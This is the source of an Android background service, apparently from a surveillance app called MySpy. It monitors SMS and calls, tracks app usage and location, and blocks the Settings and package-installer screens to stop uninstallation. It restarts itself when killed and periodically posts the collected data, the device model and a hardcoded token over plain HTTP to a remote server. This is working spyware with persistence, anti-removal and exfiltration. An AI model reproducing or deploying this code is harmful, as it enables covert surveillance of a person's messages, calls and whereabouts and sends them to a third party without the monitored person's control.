package com.myspy.myspyandroid;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import com.myspy.myspyandroid.functions.ClassSaver;
import com.myspy.myspyandroid.functions.GetLocation;
import com.myspy.myspyandroid.variables.ApplicationInformation;
import com.myspy.myspyandroid.variables.ApplicationPackage;
import com.myspy.myspyandroid.variables.SMSInfo;
import com.myspy.myspyandroid.variables.ServiceSettings;
import com.myspy.myspyandroid.variables.ServiceVariables;
import com.myspy.myspyandroid.variables.SpecialVariables;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.List;
import java.util.SortedMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;

public class MySpyService extends Service {

    ClassSaver classSaver = new ClassSaver();
    ServiceReceiver serviceReceiver = new ServiceReceiver();
    Calendar calendar = Calendar.getInstance();
    private Context tcontext = this;
    private short timervar = 0;

    int day = calendar.get(Calendar.DAY_OF_MONTH);

    public static ServiceVariables serviceVariables = new ServiceVariables();
    public static ServiceSettings serviceSettings = new ServiceSettings();
    public static SpecialVariables specialVariables = new SpecialVariables();

    File dirn;

    ServiceObserver serviceObserver = new ServiceObserver(new Handler());
    ContentResolver contentResolver;

    GetLocation getLocation;
    IntentFilter filter;

    String LastActivity = "";


    Timer timer = new Timer();

    public MySpyService() {
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d("TaskRemoved","On Task Removed");
        Intent restartService = new Intent(getApplicationContext(),
                this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager)getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() +1000, restartServicePI);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        contentResolver = this.getContentResolver();

        serviceObserver.contentResolver = contentResolver;
        contentResolver.registerContentObserver(Uri.parse("content://sms"),true, serviceObserver);



        filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        filter.addAction("android.provider.Telephony.SMS_SENT");
        filter.addAction(android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED);
        filter.addAction("android.intent.action.NEW_OUTGOING_CALL");

        registerReceiver(serviceReceiver, filter);

        return Service.START_STICKY;
    }


    @Override
    public void onCreate(){
        super.onCreate();

        Start();
    }


    void Start()
    {
        dirn  = new File( this.getDir("MySpy", Context.MODE_PRIVATE).getPath()+"/Monitoring");

        Log.d("Service","Service started");

        //nacitaju sa nastavenia
        if(classSaver.FileExist("MySpy","Settings.dat",tcontext)) {
            serviceSettings = (ServiceSettings) classSaver.LoadClassFromFile(serviceSettings.getClass(), "MySpy", "Settings.dat", tcontext);
            Log.d("Settings","Settings Loaded");
        }else{
            Log.d("Settings","Not exists");
        }


        if(classSaver.FileExist("MySpy","Special.dat",tcontext)) {
            specialVariables = (SpecialVariables) classSaver.LoadClassFromFile(specialVariables.getClass(), "MySpy", "Special.dat", tcontext);
            Log.d("SpecialVariables","Variables Loaded");
        }else{
            Log.d("SpecialVariables","Not exists");
        }


        //nacitaju sa denne premenne ak existuju
        if(new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat").exists()) {
            serviceVariables = (ServiceVariables) classSaver.LoadClassFromSpecificFile(serviceVariables.getClass(), new File(dirn +"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat"));
            Log.d("Loading Var","Loaded");
        } else
        Log.d("Loading Var","Not Exist");


        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {

                CheckService();
                SaveAll();
                Log.d("Service","Timer"+calendar.getTime());
                Log.d("Service","FILE: "+"Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat");

                if(MySpyService.serviceSettings.WebData) {
                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {

                            try {
                                PostDataToWeb();
                            } catch (Exception ex) {
                                Log.w("ThreadError", "" + ex);
                            }

                        }
                    });
                    thread.start();
                }

            }

        }, 200000,200000);


        String currentHomePackage = "";

        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            ResolveInfo resolveInfo = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
            currentHomePackage = resolveInfo.activityInfo.packageName;
            Log.d("homepackage", "HOMEPACKAGE: " + currentHomePackage);
        }catch (Exception ex)
        {
            Log.w("Error",""+ex);
        }

        final String CurrentHomePackage = currentHomePackage;


        final ActivityManager am = (ActivityManager) tcontext.getSystemService(ACTIVITY_SERVICE);

        Timer timer2 = new Timer();
        timer2.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {
                    try {

                        if(serviceSettings.MonitorApplications) {

                            String top = GetTopApp();

                            //block settings and packageinstaller if block uninstall is enabled
                            if(serviceSettings.BlockSettings) {

                                if (top.equals("com.android.settings") || top.equals("com.android.packageinstaller")) {

                                    Intent i = new Intent(Intent.ACTION_MAIN);
                                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    i.addCategory(Intent.CATEGORY_HOME);
                                    startActivity(i);
                                }
                            }


                            //Block applications
                            //check all in list and block them if they are running
                            if(!specialVariables.Blockedapps.isEmpty())
                            {
                                for(ApplicationPackage app : specialVariables.Blockedapps)
                                {
                                    if(top.equals(app.PackageName))
                                    {

                                        Intent i = new Intent(Intent.ACTION_MAIN);
                                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        i.addCategory(Intent.CATEGORY_HOME);
                                        startActivity(i);
                                    }
                                }
                            }




                                //Monitor applications
                                //Time,last running...
                                if(top!=null && !top.isEmpty() && !top.equals(CurrentHomePackage)) {
                                    if (!ApplicationInformation.ContainsPackageName(serviceVariables.Appinfo, top)) {

                                        PackageManager packageManager = getApplicationContext().getPackageManager();
                                        String appName = (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(top, PackageManager.GET_META_DATA));
                                        serviceVariables.Appinfo.add(new ApplicationInformation(top,appName));
                                        LastActivity = top;
                                    } else {

                                        int pos = ApplicationInformation.GetPosition(serviceVariables.Appinfo, top);
                                        if (pos != -1) {
                                            serviceVariables.Appinfo.get(pos).AddTime(2);
                                            LastActivity = top;
                                        }
                                    }
                                }else{
                                    int pos = ApplicationInformation.GetPosition(serviceVariables.Appinfo, LastActivity);
                                    if (pos != -1) {
                                        serviceVariables.Appinfo.get(pos).AddTime(2);
                                    }
                                }





                        }//monitorapplications

                    }catch (Exception ex)
                    {
                        Log.w("Error",""+ex);
                    }
            }

        }, 2000,2000);



        //com.android.packageinstaller
        //com.android.settings

        Log.d("DATE", SMSInfo.GetCurrentTime());

        if(serviceSettings.MonitorPosition) {
            try {
                getLocation = new GetLocation(this);
            } catch (Exception ex) {
                Log.w("Error", "" + ex);
            }
        }

        /*
        String save = classSaver.SaveClass(serviceVariables);
        Log.d("Save",save);
        Log.d("Load", classSaver.LoadClass(save, ServiceVariables.class).toString());
        */


    }


    public String GetTopApp()
    {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            String topPackageName = "";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                UsageStatsManager mUsageStatsManager = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
                long time = System.currentTimeMillis();
                // We get usage stats for the last 10 seconds
                List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 5000, time);
                // Sort the stats by the last time used
                if (stats != null) {
                    SortedMap<Long, UsageStats> mySortedMap = new TreeMap<Long, UsageStats>();
                    for (UsageStats usageStats : stats) {
                        mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
                    }
                    if (!mySortedMap.isEmpty()) {
                        topPackageName = mySortedMap.get(mySortedMap.lastKey()).getPackageName();
                    }
                }
            }

            return topPackageName;
        }else{
            ActivityManager am = (ActivityManager) getBaseContext().getSystemService(ACTIVITY_SERVICE);
            return am.getRunningTasks(1).get(0).topActivity .getPackageName();
        }
    }



    public void CheckService()
    {
        timervar++;

        calendar = Calendar.getInstance();

        //ak sa uvolni servicevariables tak aby sa nacitala zo suboru
        if(serviceVariables==null)
        {
            if(new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+calendar.get(Calendar.DAY_OF_YEAR)+".dat").exists())
                serviceVariables = (ServiceVariables) classSaver.LoadClassFromSpecificFile(serviceVariables.getClass(),new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat"));
            else
                serviceVariables = new ServiceVariables();
        }


        if(specialVariables==null)
        {
            if(classSaver.FileExist("MySpy","Special.dat",tcontext))
                specialVariables = (SpecialVariables) classSaver.LoadClassFromFile(specialVariables.getClass(), "MySpy", "Special.dat", tcontext);
            else
                specialVariables = new SpecialVariables();
        }

        //ak zacne novy den tak restartujeme hodnoty
        if(calendar.get(Calendar.DAY_OF_MONTH)!=day)
        {
            day = calendar.get(Calendar.DAY_OF_MONTH);
            serviceVariables = new ServiceVariables();
        }


        if(timervar>2) {
            if(serviceSettings.MonitorPosition) {
                try {

                    if(getLocation!=null)
                        getLocation.StopGetLocation();

                    getLocation = new GetLocation(this);
                } catch (Exception ex) {
                    Log.w("Error", "" + ex);
                }
            }

            specialVariables.ResetAverage();

            timervar=0;
        }


    }


    public void SaveAll()
    {
        calendar = Calendar.getInstance();

            //ulozime premenne do suboru
            if(!classSaver.SaveClassToSpecificFile(serviceVariables,new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat")))
            {
            Log.w("SaveAll","Failed save variables!");
            }

            if(!classSaver.SaveClassToSpecificFile(specialVariables,classSaver.GetFile("MySpy","Special.dat",tcontext)))
            {
                Log.w("SaveAll","Failed save special variables!");
            }
    }



    @Override
    public void onDestroy() {
        Log.d("Destroy","Destroyed service");
        SaveAll();
        unregisterReceiver(serviceReceiver);
        //startService(new Intent(this, MySpyService.class));

        super.onDestroy();
    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }





    void PostDataToWeb()
    {
        try {
            URL url = new URL("http://myspy.diodegames.eu/Connection/ANReport.php");

            HttpURLConnection client = (HttpURLConnection) url.openConnection();

            client.setRequestMethod("POST");
            client.setDoOutput(true);

            Calendar calendar = Calendar.getInstance();

            StringBuilder builder = new StringBuilder("");

            File dirn  = new File( this.getDir("MySpy", Context.MODE_PRIVATE).getPath()+"/Monitoring");

            StringBuilder text = new StringBuilder();

            if(new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat").exists()) {

                BufferedReader br = new BufferedReader(new FileReader( new File(dirn+"/Day_"+calendar.get(Calendar.YEAR)+"_"+(calendar.get(Calendar.MONTH)+1)+"_"+calendar.get(Calendar.DAY_OF_MONTH)+".dat") ));
                String line;

                while ((line = br.readLine()) != null) {
                    text.append(line);
                }
                br.close();

            }else{
                Log.w("File","Not Found");
            }

            builder.append ("Token=blZEHudX&ID="+MySpyService.serviceSettings.ID+"&Alias="+MySpyService.serviceSettings.Alias);
            builder.append ("&Data="+text.toString());
            builder.append("&Device="+ Build.MANUFACTURER+"   "+Build.MODEL);

            OutputStream outputPost = new BufferedOutputStream(client.getOutputStream());
            outputPost.write(builder.toString().getBytes());
            outputPost.flush();
            outputPost.close();


            String response = "";
            String line;
            BufferedReader br=new BufferedReader(new InputStreamReader(client.getInputStream()));
            while ((line=br.readLine()) != null) {
                response+=line;
            }
            Log.d("WEB",response);

            client.disconnect();

        }catch (Exception ex)
        {
            Log.w("WebError",""+ex.toString());
        }

    }

    /*

    void SetLastKnowLocation(){

        LocationManager locationManager
                = (LocationManager) getSystemService(LOCATION_SERVICE);
        Criteria c = new Criteria();
        c.setAccuracy(Criteria.ACCURACY_FINE);
        c.setAccuracy(Criteria.ACCURACY_COARSE);
        c.setAltitudeRequired(false);
        c.setBearingRequired(false);
        c.setCostAllowed(true);
        c.setPowerRequirement(Criteria.POWER_HIGH);
        String provider = locationManager.getBestProvider(c, true);
        Location location = locationManager.getLastKnownLocation(provider);

    }
    */


}
